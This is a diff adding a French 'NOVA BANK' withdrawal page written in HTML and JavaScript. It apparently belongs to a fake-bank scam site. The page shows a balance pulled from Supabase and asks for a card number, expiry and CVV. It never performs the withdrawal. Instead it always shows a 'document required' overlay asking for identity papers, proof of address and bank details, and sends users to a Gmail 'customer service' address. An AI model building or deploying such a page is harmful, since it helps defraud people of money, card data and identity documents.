@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>NOVA BANK - Retrait</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background: #f5f9ff;
+            min-height: 100vh;
+            padding-bottom: 90px;
+        }
+
+        .header {
+            background: #0b2440;
+            padding: 20px;
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 800;
+        }
+
+        .logo span {
+            color: #ff6b4a;
+        }
+
+        .back-btn {
+            background: rgba(255,255,255,0.1);
+            color: white;
+            text-decoration: none;
+            padding: 10px 20px;
+            border-radius: 40px;
+            font-size: 0.9rem;
+            transition: all 0.3s;
+        }
+
+        .back-btn:hover {
+            background: rgba(255,255,255,0.2);
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .title {
+            font-size: 2rem;
+            color: #0b2440;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+
+        .subtitle {
+            color: #5f738c;
+            margin-bottom: 30px;
+            border-left: 4px solid #ff6b4a;
+            padding-left: 15px;
+        }
+
+        .balance-card {
+            background: white;
+            border-radius: 30px;
+            padding: 25px;
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 2px solid #eef2f6;
+        }
+
+        .balance-label {
+            color: #5f738c;
+            font-weight: 600;
+        }
+
+        .balance-amount {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #0b2440;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #0b2440;
+            font-weight: 600;
+            margin-left: 6px;
+        }
+
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 16px 20px;
+            border: 2px solid #e6ecf2;
+            border-radius: 40px;
+            font-size: 1rem;
+            transition: all 0.3s;
+            background: white;
+        }
+
+        .form-group input:focus, .form-group select:focus {
+            outline: none;
+            border-color: #ff6b4a;
+            box-shadow: 0 5px 15px rgba(255,107,74,0.1);
+        }
+
+        .btn-withdraw {
+            width: 100%;
+            padding: 18px;
+            background: #0b2440;
+            color: white;
+            border: none;
+            border-radius: 40px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 20px 0;
+        }
+
+        .btn-withdraw:hover {
+            background: #1e3f6e;
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(11,36,64,0.2);
+        }
+
+        /* Message d'erreur overlay */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.5);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            backdrop-filter: blur(5px);
+        }
+
+        .overlay.show {
+            display: flex;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .message-card {
+            background: white;
+            border-radius: 40px;
+            padding: 35px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            animation: slideUp 0.4s ease;
+            border: 3px solid #ff6b4a;
+        }
+
+        @keyframes slideUp {
+            from {
+                transform: translateY(30px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .exclamation {
+            width: 70px;
+            height: 70px;
+            background: #ff6b4a;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        .exclamation span {
+            color: white;
+            font-size: 3rem;
+            font-weight: 800;
+        }
+
+        .message-card h2 {
+            color: #ff6b4a;
+            font-size: 1.8rem;
+            margin-bottom: 15px;
+        }
+
+        .message-card p {
+            color: #0b2440;
+            font-size: 1.1rem;
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+
+        .doc-list {
+            background: #f9fcff;
+            border-radius: 30px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: left;
+            list-style: none;
+        }
+
+        .doc-list li {
+            padding: 12px 0;
+            border-bottom: 1px solid #eef2f6;
+            color: #0b2440;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .doc-list li:last-child {
+            border-bottom: none;
+        }
+
+        .doc-list li::before {
+            content: "•";
+            color: #ff6b4a;
+            font-weight: bold;
+            font-size: 1.5rem;
+        }
+
+        .btn-contact {
+            width: 100%;
+            padding: 16px;
+            background: #ff6b4a;
+            color: white;
+            border: none;
+            border-radius: 40px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 15px 0;
+        }
+
+        .btn-contact:hover {
+            background: #ff8a5c;
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(255,107,74,0.3);
+        }
+
+        .btn-close {
+            background: transparent;
+            border: 2px solid #e6ecf2;
+            color: #0b2440;
+            padding: 12px;
+            border-radius: 40px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+        }
+
+        .btn-close:hover {
+            background: #f0f4ff;
+            border-color: #0b2440;
+        }
+
+        .alert {
+            padding: 15px;
+            border-radius: 30px;
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        .alert-error {
+            background: #ffeae8;
+            color: #ff6b4a;
+            border: 1px solid #ffcdc8;
+        }
+
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: white;
+            display: flex;
+            justify-content: space-around;
+            padding: 15px;
+            border-top: 2px solid #ff6b4a;
+            border-radius: 40px 40px 0 0;
+        }
+
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: #8e9daf;
+            cursor: pointer;
+            background: none;
+            border: none;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+
+        .nav-item.active {
+            color: #ff6b4a;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 40px;
+            color: #8e9daf;
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="logo">NOVA<span>BANK</span></div>
+        <a href="dashboard.html" class="back-btn">← Retour</a>
+    </header>
+
+    <div class="container">
+        <div class="alert" id="alertMessage"></div>
+
+        <h1 class="title">Effectuer un retrait</h1>
+        <div class="subtitle">Remplissez le formulaire ci-dessous</div>
+
+        <!-- Solde -->
+        <div class="balance-card">
+            <span class="balance-label">Solde disponible</span>
+            <span class="balance-amount" id="userBalance">0,00 €</span>
+        </div>
+
+        <form id="withdrawForm">
+            <div class="form-group">
+                <label>Montant du retrait (€)</label>
+                <input type="number" id="amount" placeholder="Ex: 500" value="100">
+            </div>
+
+            <div class="form-group">
+                <label>Compte à débiter</label>
+                <select id="account">
+                    <option value="current">Compte courant • ****5678</option>
+                    <option value="savings">Compte épargne • ****9012</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>Numéro de carte bancaire</label>
+                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456">
+            </div>
+
+            <div class="form-group">
+                <label>Date d'expiration</label>
+                <input type="text" id="cardExpiry" placeholder="MM/AA">
+            </div>
+
+            <div class="form-group">
+                <label>CVV</label>
+                <input type="text" id="cardCVV" placeholder="123">
+            </div>
+
+            <button type="button" class="btn-withdraw" onclick="processWithdraw()">
+                EFFECTUER LE RETRAIT
+            </button>
+        </form>
+    </div>
+
+    <!-- Overlay avec message de sécurité -->
+    <div class="overlay" id="securityOverlay">
+        <div class="message-card">
+            <div class="exclamation">
+                <span>!</span>
+            </div>
+            
+            <h2>Document requis</h2>
+            
+            <p>Pour des raisons de sécurité, un document de confirmation est nécessaire.</p>
+
+            <ul class="doc-list">
+                <li>Pièce d'identité</li>
+                <li>Justificatif de domicile</li>
+                <li>RIB du compte</li>
+                <li>Formulaire signé</li>
+            </ul>
+
+            <p style="color: #ff6b4a; font-weight: 600; margin: 15px 0;">
+                ⏱️ Délai: 24-48h
+            </p>
+
+            <button class="btn-contact" onclick="contactSupport()">
+                CONTACTER LE SUPPORT
+            </button>
+
+            <button class="btn-close" onclick="closeOverlay()">
+                FERMER
+            </button>
+        </div>
+    </div>
+
+    <nav class="bottom-nav">
+        <a href="dashboard.html" class="nav-item">Accueil</a>
+        <a href="retrait.html" class="nav-item active">Retrait</a>
+        <a href="transfert.html" class="nav-item">Transfert</a>
+        <button class="nav-item" onclick="logout()">Déconnexion</button>
+    </nav>
+
+    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
+    <script>
+        const SUPABASE_URL = 'https://lvbdafzdsuotairqkcnv.supabase.co';
+        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx2YmRhZnpkc3VvdGFpcnFrY252Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzEwNTg0MTUsImV4cCI6MjA4NjYzNDQxNX0.MWPo0ZnTNTzK4_8N1GB_mtri7LkgfP43W4gjBGB7zhI';
+        
+        const { createClient } = supabase;
+        const novabank = createClient(SUPABASE_URL, SUPABASE_KEY);
+
+        let userBalance = 0;
+
+        async function loadUserBalance() {
+            try {
+                const { data: { user } } = await novabank.auth.getUser();
+                
+                if (!user) {
+                    window.location.href = 'connexion.html';
+                    return;
+                }
+
+                const { data: profile } = await novabank
+                    .from('profiles')
+                    .select('solde')
+                    .eq('id', user.id)
+                    .single();
+
+                if (profile) {
+                    userBalance = profile.solde || 0;
+                    document.getElementById('userBalance').textContent = userBalance.toFixed(2).replace('.', ',') + ' €';
+                }
+            } catch (error) {
+                console.error('Erreur chargement solde:', error);
+            }
+        }
+
+        function showAlert(message, type) {
+            const alert = document.getElementById('alertMessage');
+            alert.textContent = message;
+            alert.className = `alert alert-${type}`;
+            alert.style.display = 'block';
+            setTimeout(() => alert.style.display = 'none', 3000);
+        }
+
+        function processWithdraw() {
+            const amount = parseFloat(document.getElementById('amount').value);
+            const cardNumber = document.getElementById('cardNumber').value.trim();
+            const cardExpiry = document.getElementById('cardExpiry').value.trim();
+            const cardCVV = document.getElementById('cardCVV').value.trim();
+
+            // Validations
+            if (!amount || amount <= 0) {
+                showAlert('Montant invalide', 'error');
+                return;
+            }
+
+            if (!cardNumber) {
+                showAlert('Numéro de carte requis', 'error');
+                return;
+            }
+
+            if (!cardExpiry) {
+                showAlert('Date d\'expiration requise', 'error');
+                return;
+            }
+
+            if (!cardCVV) {
+                showAlert('CVV requis', 'error');
+                return;
+            }
+
+            if (amount > userBalance) {
+                showAlert('Solde insuffisant', 'error');
+                return;
+            }
+
+            // Afficher l'overlay
+            document.getElementById('securityOverlay').classList.add('show');
+        }
+
+        function closeOverlay() {
+            document.getElementById('securityOverlay').classList.remove('show');
+        }
+
+        function contactSupport() {
+            const amount = document.getElementById('amount').value;
+            
+            const sujet = encodeURIComponent('Demande de document de retrait');
+            const message = encodeURIComponent(
+                `Bonjour,\n\n` +
+                `Je souhaite effectuer un retrait de ${amount} € et j'ai besoin du document de confirmation.\n\n` +
+                `Merci de me faire parvenir les instructions.\n\n` +
+                `Cordialement.`
+            );
+            
+            window.location.href = `mailto:serviceclient08987@gmail.com?subject=${sujet}&body=${message}`;
+            
+            showAlert('Redirection vers votre client mail...', 'success');
+            setTimeout(closeOverlay, 2000);
+        }
+
+        async function logout() {
+            await novabank.auth.signOut();
+            window.location.href = 'connexion.html';
+        }
+
+        loadUserBalance();
+    </script>
+</body>
+</html>
